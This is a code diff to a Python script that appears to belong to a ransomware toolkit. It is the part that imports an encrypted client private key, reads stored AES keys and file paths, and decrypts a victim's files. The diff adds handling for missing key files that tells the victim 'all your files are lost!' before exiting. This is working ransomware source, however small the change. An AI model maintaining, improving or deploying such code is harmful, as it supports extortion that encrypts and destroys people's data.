@@ -12,6 +12,7 @@ import pickle
 from Crypto.Cipher import PKCS1_OAEP
 import string 
 import random
+import sys
 
 
 logo = """
@@ -114,8 +115,13 @@ def menu():
 
     # import the private key
     print("{}Importing the encrypted client private key".format(WHITE))
-    with open(ransomware_path + '/encrypted_client_private_key.key', 'rb') as f:
-        encrypted_client_private_key = pickle.load(f)
+    try:
+        with open(ransomware_path + '/encrypted_client_private_key.key', 'rb') as f:
+            encrypted_client_private_key = pickle.load(f)
+    except FileNotFoundError:
+        print("encrypted client private key not found, I'm sorry. but all your files are lost!")
+        sys.exit(-1)
+
     print("{}OK{}".format(GREEN, WHITE))
 
     key_to_be_sent = base64.b64encode(str(encrypted_client_private_key))
@@ -136,9 +142,13 @@ def menu():
         f.write(client_private_key)
 
     # GET THE AES KEYS and path
-    with open(ransomware_path + "/AES_encrypted_keys.txt") as f:
-        content = f.read()
-     
+    try:
+        with open(ransomware_path + "/AES_encrypted_keys.txt") as f:
+            content = f.read()
+    except FileNotFoundError:
+        print("AES keys not found. Sorry but all your files are lost!")
+        sys.exit(-1)
+
     # get the aes keys and IV's and paths back
     print('Decrypting the files ...')
     content = content.split('\n')
